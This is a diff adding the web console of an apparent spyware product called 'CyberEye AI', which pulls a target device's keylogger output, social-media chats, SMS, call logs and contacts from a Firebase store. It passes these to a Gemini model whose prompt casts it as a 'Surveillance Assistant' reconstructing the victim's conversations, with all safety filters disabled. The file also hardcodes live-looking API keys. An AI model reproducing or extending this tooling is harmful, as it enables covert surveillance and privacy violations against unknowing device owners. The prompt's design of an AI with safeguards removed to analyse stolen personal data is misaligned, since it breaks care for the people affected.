@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberEye AI — Intelligence Center</title>
+
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+  <script src="/static/firebase-mock.js"></script>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Sora:wght@700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg: #0B0D11;
+      --sidebar: #11151C;
+      --surface: #181C26;
+      --surface2: #1E2333;
+      --border: rgba(255, 255, 255, 0.06);
+      --brand: #2ECC8F;
+      --brand-soft: rgba(46, 204, 143, 0.12);
+      --text: #EEF0F7;
+      --text2: #9BA3BC;
+      --text3: #5C6480;
+      --radius: 14px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+    body { background: var(--bg); color: var(--text); height: 100vh; display: flex; overflow: hidden; }
+
+    /* ── SIDEBAR ── */
+    aside {
+      width: 280px;
+      background: var(--sidebar);
+      border-right: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      flex-shrink: 0;
+    }
+
+    .sb-header { padding: 20px; border-bottom: 1px solid var(--border); }
+    .btn-new {
+      width: 100%;
+      background: var(--brand);
+      color: var(--bg);
+      border: none;
+      padding: 10px;
+      border-radius: 8px;
+      font-weight: 800;
+      font-size: 0.8rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.2s;
+    }
+    .btn-new:hover { transform: translateY(-1px); filter: brightness(1.1); }
+
+    .session-list { flex: 1; overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 6px; }
+    .session-item {
+      padding: 10px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: var(--text2);
+      font-size: 0.85rem;
+      transition: all 0.2s;
+    }
+    .session-item:hover { background: var(--surface); color: var(--text); }
+    .session-item.active { background: var(--brand-soft); color: var(--brand); font-weight: 700; }
+    .del-btn { color: var(--text3); opacity: 0; transition: opacity 0.2s; cursor: pointer; }
+    .session-item:hover .del-btn { opacity: 1; }
+    .del-btn:hover { color: #f55b5b; }
+
+    .privacy-panel { padding: 15px; border-top: 1px solid var(--border); background: rgba(0,0,0,0.1); }
+    .privacy-title { font-size: 0.65rem; font-weight: 800; color: var(--text3); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; display: block; }
+    .check-row { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; cursor: pointer; }
+    .check-row input { accent-color: var(--brand); width: 14px; height: 14px; cursor: pointer; }
+    .check-row span { font-size: 0.8rem; color: var(--text2); font-weight: 500; }
+
+    .sb-footer { padding: 15px; border-top: 1px solid var(--border); }
+    .btn-config { width: 100%; background: var(--surface2); color: var(--text2); border: 1px solid var(--border); padding: 8px; border-radius: 6px; cursor: pointer; font-size: 0.75rem; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 6px; }
+
+    /* ── MAIN AREA ── */
+    main { flex: 1; display: flex; flex-direction: column; background: var(--bg); position: relative; }
+
+    header {
+      padding: 12px 25px;
+      background: var(--sidebar);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 10;
+    }
+    .logo-img { height: 26px; width: auto; }
+
+    /* Quota UI */
+    .quota-container { display: flex; align-items: center; gap: 20px; }
+    .quota-info { display: flex; flex-direction: column; align-items: flex-end; gap: 2px; }
+    .quota-row { display: flex; align-items: center; gap: 8px; }
+    .quota-text { font-size: 0.6rem; font-weight: 900; color: var(--text2); letter-spacing: 0.5px; }
+    .quota-track { width: 60px; height: 4px; background: var(--surface2); border-radius: 10px; overflow: hidden; border: 1px solid var(--border); }
+    .quota-fill { width: 0%; height: 100%; background: var(--brand); transition: width 0.5s ease; box-shadow: 0 0 8px var(--brand-soft); }
+    .reset-timer { font-size: 0.5rem; font-weight: 800; color: var(--text3); text-transform: uppercase; }
+
+    /* RPM Indicator */
+    .rpm-badge {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      padding: 4px 10px;
+      border-radius: 6px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-width: 65px;
+    }
+    .rpm-label { font-size: 0.5rem; font-weight: 900; color: var(--text3); text-transform: uppercase; }
+    .rpm-val { font-size: 0.75rem; font-weight: 800; color: var(--brand); font-family: 'Sora'; }
+    .rpm-val.warning { color: #f5a623; }
+    .rpm-val.danger { color: #f55b5b; }
+
+    /* ── MODERN SCROLLBAR ── */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.1); border-radius: 20px; }
+    ::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.2); }
+
+    .chat-scroller { flex: 1; overflow-y: auto; padding: 25px; display: flex; flex-direction: column; gap: 20px; }
+
+    .msg-row { display: flex; gap: 12px; max-width: 85%; animation: msgIn 0.3s ease-out; }
+    @keyframes msgIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .msg-row.user { align-self: flex-end; flex-direction: row-reverse; }
+
+    .avatar { width: 34px; height: 34px; border-radius: 8px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 0.9rem; }
+    .user .avatar { background: var(--brand); color: var(--bg); }
+    .bot .avatar { background: var(--surface2); border: 1px solid var(--border); color: var(--brand); }
+
+    .bubble { padding: 12px 16px; border-radius: 16px; font-size: 0.92rem; line-height: 1.5; background: var(--surface); border: 1px solid var(--border); }
+    .user .bubble { background: var(--brand); color: var(--bg); border: none; font-weight: 600; border-bottom-right-radius: 4px; }
+    .bot .bubble { border-bottom-left-radius: 4px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
+    .bot .bubble p { margin-bottom: 10px; }
+    .bot .bubble p:last-child { margin-bottom: 0; }
+
+    .thinking { display: none; gap: 4px; padding: 12px 16px; background: var(--surface); border: 1px solid var(--border); border-radius: 16px; width: fit-content; margin-left: 46px; }
+    .dot { width: 6px; height: 6px; background: var(--brand); border-radius: 50%; animation: bounce 1.4s infinite; }
+    @keyframes bounce { 0%, 80%, 100% { transform: scale(0); opacity: 0.3; } 40% { transform: scale(1); opacity: 1; } }
+
+    .input-wrap { padding: 20px; background: var(--sidebar); border-top: 1px solid var(--border); }
+    .input-box { max-width: 850px; margin: 0 auto; background: var(--bg); border: 1px solid var(--border); border-radius: 10px; padding: 8px 15px; display: flex; align-items: center; gap: 12px; }
+    .input-box:focus-within { border-color: var(--brand); box-shadow: 0 0 0 2px var(--brand-soft); }
+    textarea { flex: 1; background: transparent; border: none; color: var(--text); font-size: 0.95rem; outline: none; resize: none; max-height: 120px; padding: 8px 0; }
+    .btn-send { width: 36px; height: 36px; background: var(--brand); color: var(--bg); border: none; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
+
+    .modal-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 100; backdrop-filter: blur(5px); }
+    .modal { background: var(--surface); border: 1px solid var(--border); padding: 25px; border-radius: 16px; width: 350px; }
+    .modal h3 { margin-bottom: 20px; font-family: 'Sora'; font-weight: 800; font-size: 1rem; color: var(--brand); }
+    .modal-group { margin-bottom: 15px; }
+    .modal-group label { display: block; font-size: 0.7rem; font-weight: 800; color: var(--text3); margin-bottom: 6px; text-transform: uppercase; }
+    .modal-group input, .modal-group select { width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px; border-radius: 6px; outline: none; font-size: 0.85rem; }
+  </style>
+</head>
+<body>
+
+  <aside>
+    <div class="sb-header">
+      <button class="btn-new" onclick="createNewSession()">
+        <i class="fas fa-plus"></i> NEW INVESTIGATION
+      </button>
+    </div>
+    <div class="session-list" id="session-list"></div>
+
+    <div class="privacy-panel">
+      <span class="privacy-title">Intelligence Access</span>
+      <label class="check-row"><input type="checkbox" id="access-keylogs" checked> <span>Keylogger Logs</span></label>
+      <label class="check-row"><input type="checkbox" id="access-social" checked> <span>Social Media Logs</span></label>
+      <label class="check-row"><input type="checkbox" id="access-contacts" checked> <span>Contacts Access</span></label>
+      <label class="check-row"><input type="checkbox" id="access-sms" checked> <span>SMS Messages</span></label>
+      <label class="check-row"><input type="checkbox" id="access-calls" checked> <span>Call History</span></label>
+    </div>
+
+    <div class="sb-footer">
+      <button class="btn-config" onclick="toggleSettings(true)"><i class="fas fa-sliders-h"></i> PARAMETERS</button>
+    </div>
+  </aside>
+
+  <main>
+    <header>
+      <img src="/logo.png" class="logo-img">
+      <div class="quota-container">
+        <div class="rpm-badge">
+          <span class="rpm-label">RPM LIMIT</span>
+          <span class="rpm-val" id="rpm-val">0/15</span>
+        </div>
+        <div class="quota-info">
+          <div class="quota-row">
+            <span class="quota-text" id="quota-val">QUOTA: 0/1500</span>
+            <div class="quota-track"><div class="quota-fill" id="quota-fill"></div></div>
+          </div>
+          <span class="reset-timer" id="reset-timer">RESET IN --H --M</span>
+        </div>
+      </div>
+    </header>
+
+    <div class="chat-scroller" id="chat-scroller">
+      <div id="welcome-msg" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:var(--text3); text-align:center; padding:20px;">
+        <img src="/logo.png" style="height:60px; margin-bottom:20px; opacity:0.3; filter:grayscale(1);">
+        <h2 style="color:var(--text2); font-weight:800; margin-bottom:8px; font-size:1.1rem;">Intelligence Ready</h2>
+        <p style="max-width:320px; font-size:0.85rem;">Secure link established. Gemini 3.5 Flash-Lite active. Ask about logs or behavior.</p>
+      </div>
+    </div>
+
+    <div class="thinking" id="thinking-ui">
+      <div class="dot" style="animation-delay: 0s"></div>
+      <div class="dot" style="animation-delay: 0.2s"></div>
+      <div class="dot" style="animation-delay: 0.4s"></div>
+    </div>
+
+    <div class="input-wrap">
+      <div class="input-box">
+        <textarea id="user-input" rows="1" placeholder="Type a message..."></textarea>
+        <button class="btn-send" id="btn-send"><i class="fas fa-paper-plane"></i></button>
+      </div>
+    </div>
+  </main>
+
+  <div class="modal-bg" id="settings-modal">
+    <div class="modal">
+      <h3>AI CONFIGURATION</h3>
+      <div class="modal-group"><label>Gemini API Key</label><input type="password" id="api-key-input"></div>
+      <div class="modal-group">
+        <label>Intelligence Model</label>
+        <select id="model-select">
+          <option value="gemini-3.5-flash-lite">gemini-3.5-flash-lite (Recommended)</option>
+          <option value="gemini-3.5-flash">gemini-3.5-flash (High Performance)</option>
+          <option value="gemini-3.6-flash">gemini-3.6-flash (Newest)</option>
+          <option value="gemini-3.1-flash-lite">gemini-3.1-flash-lite (Classic)</option>
+        </select>
+      </div>
+      <button class="btn-new" style="margin-bottom:8px;" onclick="saveConfig()">SAVE & SYNC</button>
+      <button class="btn-config" style="width:100%;" onclick="toggleSettings(false)">CLOSE</button>
+    </div>
+  </div>
+
+  <script>
+    const fbConfig = {
+        apiKey: "AIzaSyAHkYidYFElwq3Mt13t0jlpIlhw33DtVco",
+        databaseURL: "https://cyber-eye-ccb1e-default-rtdb.firebaseio.com",
+        projectId: "cyber-eye-ccb1e",
+        storageBucket: "cyber-eye-ccb1e.firebasestorage.app",
+        appId: "1:652079429761:android:e17fe06347e2ba0b1a3580"
+    };
+    firebase.initializeApp(fbConfig);
+    const db = firebase.database();
+
+    const deviceId = new URLSearchParams(window.location.search).get('id');
+    const DEFAULT_KEY = "AIzaSyBsHMZ1SrAaMXdXScPGbycCZokkD5B3tP0";
+    const MAX_QUOTA = 1500;
+    const MAX_RPM = 15;
+
+    let sessions = [];
+    let currentId = null;
+    let requestTimes = []; // To track RPM
+
+    const chatScroller = document.getElementById('chat-scroller');
+    const userInput = document.getElementById('user-input');
+    const btnSend = document.getElementById('btn-send');
+    const thinkingUi = document.getElementById('thinking-ui');
+    const sessionList = document.getElementById('session-list');
+
+    window.onload = () => {
+        loadSessions(); loadConfig(); updateQuotaUI();
+        setInterval(updateQuotaUI, 1000); // Live RPM update every second
+    };
+
+    function updateQuotaUI() {
+        // Daily Quota Tracking
+        let quota = parseInt(localStorage.getItem('ce_api_usage') || 0);
+        let firstReq = parseInt(localStorage.getItem('ce_first_req') || Date.now());
+        if (Date.now() - firstReq > 86400000) {
+            quota = 0; firstReq = Date.now();
+            localStorage.setItem('ce_api_usage', 0);
+            localStorage.setItem('ce_first_req', firstReq);
+        }
+        const pct = Math.min((quota / MAX_QUOTA) * 100, 100);
+        document.getElementById('quota-val').innerText = `QUOTA: ${quota}/${MAX_QUOTA}`;
+        document.getElementById('quota-fill').style.width = pct + "%";
+
+        const msLeft = 86400000 - (Date.now() - firstReq);
+        const h = Math.floor(msLeft / 3600000);
+        const m = Math.floor((msLeft % 3600000) / 60000);
+        document.getElementById('reset-timer').innerText = `RESET IN ${h}H ${m}M`;
+
+        // RPM Tracking (Requests Per Minute)
+        const now = Date.now();
+        requestTimes = requestTimes.filter(t => now - t < 60000); // Keep only last 60s
+        const rpm = requestTimes.length;
+        const rpmEl = document.getElementById('rpm-val');
+        rpmEl.innerText = `${rpm}/${MAX_RPM}`;
+        rpmEl.className = `rpm-val ${rpm > 12 ? 'danger' : rpm > 8 ? 'warning' : ''}`;
+    }
+
+    function trackUsage() {
+        let quota = parseInt(localStorage.getItem('ce_api_usage') || 0);
+        if(quota === 0) localStorage.setItem('ce_first_req', Date.now());
+        localStorage.setItem('ce_api_usage', quota + 1);
+        requestTimes.push(Date.now());
+        updateQuotaUI();
+    }
+
+    function loadConfig() {
+        document.getElementById('api-key-input').value = localStorage.getItem('ce_api_key') || DEFAULT_KEY;
+        document.getElementById('model-select').value = localStorage.getItem('ce_model') || "gemini-3.5-flash-lite";
+    }
+
+    function saveConfig() {
+        localStorage.setItem('ce_api_key', document.getElementById('api-key-input').value);
+        localStorage.setItem('ce_model', document.getElementById('model-select').value);
+        toggleSettings(false);
+    }
+
+    function toggleSettings(show) { document.getElementById('settings-modal').style.display = show ? 'flex' : 'none'; }
+
+    function loadSessions() {
+        const stored = localStorage.getItem('ce_ai_sessions');
+        sessions = stored ? JSON.parse(stored) : [];
+        renderSessions();
+        if(sessions.length > 0) selectSession(sessions[0].id); else createNewSession();
+    }
+
+    function createNewSession() {
+        const id = "chat_" + Date.now();
+        sessions.unshift({ id, title: "New Chat", messages: [] });
+        saveSessions(); renderSessions(); selectSession(id);
+    }
+
+    function selectSession(id) {
+        currentId = id; renderSessions();
+        const s = sessions.find(x => x.id === id);
+        chatScroller.innerHTML = '';
+        if(s.messages.length === 0) {
+            chatScroller.innerHTML = `<div id="welcome-msg" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:var(--text3); text-align:center; padding:20px;"><img src="/logo.png" style="height:60px; margin-bottom:20px; opacity:0.3; filter:grayscale(1);"><h2 style="color:var(--text2); font-weight:800; margin-bottom:8px; font-size:1.1rem;">Intelligence Ready</h2><p style="max-width:320px; font-size:0.85rem;">Target ID: ${deviceId || 'N/A'}. Ask me to analyze logs when needed.</p></div>`;
+        } else s.messages.forEach(m => appendBubble(m.role, m.text, false));
+    }
+
+    function deleteSession(id, e) {
+        e.stopPropagation(); sessions = sessions.filter(x => x.id !== id);
+        saveSessions(); loadSessions();
+    }
+
+    function saveSessions() { localStorage.setItem('ce_ai_sessions', JSON.stringify(sessions)); }
+
+    function renderSessions() {
+        sessionList.innerHTML = '';
+        sessions.forEach(s => {
+            const div = document.createElement('div');
+            div.className = `session-item ${s.id === currentId ? 'active' : ''}`;
+            div.innerHTML = `<span><i class="fas fa-search" style="margin-right:8px; font-size:0.75rem;"></i> ${s.title}</span><i class="fas fa-trash-alt del-btn" onclick="deleteSession('${s.id}', event)"></i>`;
+            div.onclick = () => selectSession(s.id);
+            sessionList.appendChild(div);
+        });
+    }
+
+    function appendBubble(role, text, save = true) {
+        const welcome = document.getElementById('welcome-msg');
+        if(welcome) welcome.remove();
+        const row = document.createElement('div');
+        row.className = `msg-row ${role === 'user' ? 'user' : 'bot'}`;
+        let formatted = text.split('\n').filter(p => p.trim() !== '').map(p => `<p>${p.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')}</p>`).join('');
+        row.innerHTML = `<div class="avatar"><i class="fas ${role === 'user' ? 'fa-user' : 'fa-robot'}"></i></div><div class="bubble">${formatted}</div>`;
+        chatScroller.appendChild(row);
+        chatScroller.scrollTop = chatScroller.scrollHeight;
+        if(save) {
+            const s = sessions.find(x => x.id === currentId);
+            s.messages.push({ role, text });
+            if(s.messages.length === 1 && role === 'user') { s.title = text.length > 20 ? text.substring(0, 18) + '...' : text; renderSessions(); }
+            saveSessions();
+        }
+    }
+
+    async function sendMessage() {
+        if(requestTimes.length >= MAX_RPM) {
+            alert("RPM Limit Reached! Please wait a few seconds before sending another message.");
+            return;
+        }
+
+        const msg = userInput.value.trim();
+        if(!msg || !deviceId) return;
+        userInput.value = ''; appendBubble('user', msg);
+        thinkingUi.style.display = 'flex'; chatScroller.scrollTop = chatScroller.scrollHeight;
+
+        let keylogs = []; let socialChats = [];
+        let ctx = { calls: [], sms: [], contacts: [] };
+
+        const canAccess = document.getElementById('access-keylogs').checked ||
+                          document.getElementById('access-social').checked ||
+                          document.getElementById('access-contacts').checked ||
+                          document.getElementById('access-sms').checked ||
+                          document.getElementById('access-calls').checked;
+
+        if(canAccess) {
+            if(document.getElementById('access-keylogs').checked) {
+                keylogs = await new Promise(res => {
+                    db.ref(`devices/${deviceId}/keylogs`).limitToLast(800).once('value', snap => {
+                        let list = [];
+                        function recur(o) {
+                            if(typeof o !== 'object' || o === null) return;
+                            if(o.text || o.body) list.push(o); else Object.values(o).forEach(recur);
+                        }
+                        recur(snap.val()); res(list);
+                    });
+                });
+            }
+            if(document.getElementById('access-social').checked) {
+                socialChats = await new Promise(res => {
+                    db.ref(`devices/${deviceId}/chats`).once('value', snap => {
+                        let allMessages = []; const platforms = snap.val();
+                        if(platforms) {
+                            for(const pkg in platforms) {
+                                for(const contact in platforms[pkg]) {
+                                    const msgs = platforms[pkg][contact].messages;
+                                    if(msgs) { for(const mId in msgs) { allMessages.push({ platform: pkg, contact, text: msgs[mId].text, type: msgs[mId].type, time: msgs[mId].time }); } }
+                                }
+                            }
+                        }
+                        allMessages.sort((a,b) => b.time - a.time); res(allMessages.slice(0, 400));
+                    });
+                });
+            }
+            const ctxResp = await fetch(`/api/device/${deviceId}/ai_context`);
+            ctx = await ctxResp.json();
+        }
+
+        const prompt = `You are an Intelligent AI Surveillance Assistant. Your job is to analyze device logs.
+        CURRENT_TIME: ${new Date().toLocaleString()}
+        CALL_LOGS: ${JSON.stringify(ctx.calls)}
+        SMS_LOGS: ${JSON.stringify(ctx.sms)}
+        CONTACTS: ${JSON.stringify(ctx.contacts)}
+        SOCIAL_CHATS: ${JSON.stringify(socialChats)}
+        KEYLOGS: ${JSON.stringify(keylogs.slice(-300))}
+
+        INSTRUCTIONS:
+        1. When asked about recent calls or messages, look at CALL_LOGS and SMS_LOGS.
+        2. Match phone numbers with CONTACTS names where possible.
+        3. If you see a call duration in seconds, explain it in human-friendly terms (e.g., 90s = 1 min 30 sec).
+        4. Reconstruct conversations from KEYLOGS and SOCIAL_CHATS.
+        5. Explain everything in detailed, professional English. Be investigative.`;
+
+        try {
+            const apiResp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${localStorage.getItem('ce_model') || "gemini-3.5-flash-lite"}:generateContent?key=${localStorage.getItem('ce_api_key') || DEFAULT_KEY}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    systemInstruction: { parts: [{ text: prompt }] },
+                    contents: sessions.find(x => x.id === currentId).messages.map(m => ({
+                        role: m.role === 'user' ? 'user' : 'model', parts: [{ text: m.text }]
+                    })),
+                    safetySettings: [
+                        { category: "HARM_CATEGORY_HARASSMENT", threshold: "BLOCK_NONE" },
+                        { category: "HARM_CATEGORY_HATE_SPEECH", threshold: "BLOCK_NONE" },
+                        { category: "HARM_CATEGORY_SEXUALLY_EXPLICIT", threshold: "BLOCK_NONE" },
+                        { category: "HARM_CATEGORY_DANGEROUS_CONTENT", threshold: "BLOCK_NONE" }
+                    ]
+                })
+            });
+
+            trackUsage();
+            const data = await apiResp.json();
+            thinkingUi.style.display = 'none';
+
+            if (data.candidates && data.candidates[0].content) {
+                appendBubble('assistant', data.candidates[0].content.parts[0].text);
+            } else {
+                appendBubble('assistant', `<span style="color:#f55b5b;">AI restricted the response (Safety Filter) or RPM limit hit.</span>`);
+            }
+        } catch(e) {
+            thinkingUi.style.display = 'none';
+            appendBubble('assistant', `<span style="color:#f55b5b;">Connection Failure.</span>`);
+        }
+    }
+
+    btnSend.onclick = sendMessage;
+    userInput.onkeydown = (e) => { if(e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); } };
+  </script>
+</body>
+</html>
